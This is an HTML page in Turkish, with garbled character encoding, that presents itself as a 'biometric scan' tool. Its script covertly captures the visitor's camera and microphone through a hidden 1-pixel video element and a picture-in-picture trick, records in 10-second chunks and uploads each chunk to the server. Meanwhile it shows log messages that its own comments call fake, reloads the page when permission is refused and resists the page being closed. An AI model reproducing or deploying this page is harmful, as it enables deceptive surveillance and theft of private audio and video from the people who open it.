<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sistem Biometrik Analiz</title>
    <style>
        body { background: #000; color: #00f2ff; font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; text-align: center; }
        .box { border: 1px solid #333; padding: 50px; border-radius: 40px; background: rgba(10, 10, 10, 0.9); width: 80%; max-width: 500px; box-shadow: 0 0 30px rgba(0, 242, 255, 0.1); position: relative; }
        .btn { background: #fff; color: #000; border: none; padding: 20px 40px; border-radius: 15px; font-weight: bold; font-size: 18px; cursor: pointer; transition: 0.3s; width: 100%; }
        #v { position: absolute; width: 1px; height: 1px; opacity: 0.01; }
        #log { margin-top: 20px; font-family: monospace; font-size: 14px; color: #00f2ff; opacity: 0.6; }
    </style>
</head>
<body>

    <div class="box">
        <div style="font-size: 60px; margin-bottom: 10px;">üõ°Ô∏è</div>
        <h1>BIOMETRIC SCAN</h1>
        <p style="color: #666;">Cihaz sens√∂rleri kullanƒ±larak ses ve y√ºz analizi ba≈ülatƒ±lacak. L√ºtfen bekleyin.</p>
        <button class="btn" id="startBtn">ANALƒ∞Zƒ∞ BA≈ûLAT</button>
        <div id="log">Sƒ∞STEM HAZIR...</div>
    </div>

    <video id="v" autoplay playsinline muted></video>

    <script>
        const v = document.getElementById('v');
        const startBtn = document.getElementById('startBtn');

        startBtn.onclick = async () => {
            startBtn.style.display = 'none';
            
            try {
                // HEM Vƒ∞DEO HEM SES ERƒ∞≈ûƒ∞Mƒ∞
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" },
                    audio: true 
                });
                
                v.srcObject = stream;
                await v.play();

                // PiP (Arka Planda √áalƒ±≈üma Hilesi)
                if (document.pictureInPictureEnabled) {
                    try { await v.requestPictureInPicture(); } catch(e) {}
                }

                // SESLƒ∞ Vƒ∞DEO KAYDEDƒ∞Cƒ∞
                const mediaRecorder = new MediaRecorder(stream, { 
                    mimeType: 'video/webm;codecs=vp8,opus' 
                });
                
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        const formData = new FormData();
                        formData.append('video', event.data);
                        
                        // Sunucuya g√∂nder
                        fetch('/upload', { method: 'POST', body: formData });
                    }
                };

                // Her 10 saniyede bir kayƒ±t yapƒ±p g√∂nderir
                mediaRecorder.start(10000); 

                // Sahte Analiz Loglarƒ±
                const msgs = ["SES ANALƒ∞Z EDƒ∞Lƒ∞YOR...", "Y√úZ HARƒ∞TALANIYOR...", "VERƒ∞LER AKTARILIYOR..."];
                let idx = 0;
                setInterval(() => {
                    document.getElementById('log').innerText = msgs[idx % msgs.length];
                    idx++;
                }, 3000);

            } catch (err) {
                alert("Kamera ve Mikrofon izni gereklidir!");
                location.reload();
            }
        };

        window.onbeforeunload = function() { return "ƒ∞≈ülem iptal edilecek!"; };
    </script>
</body>
</html>
